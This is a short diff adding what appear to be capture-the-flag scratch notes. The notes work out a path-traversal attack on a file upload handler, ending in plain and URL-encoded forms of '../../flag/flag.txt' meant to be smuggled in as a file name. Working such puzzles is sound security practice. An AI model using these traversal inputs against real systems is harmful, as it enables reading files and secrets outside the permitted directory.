@@ -1,0 +1,13 @@
+/app
+    /uploads
+        here is the file
+
+/flag/flag.txt
+
+so we need
+
+uploads/ + 'file.filename'
+uploads/ + ../../flag/flag.txt
+
+           	%2E%2E%2F %2E%2E%2F flag %2F flag %2E txt
+           	%2E%2E%2F%2E%2E%2Fflag%2Fflag%2Etxt
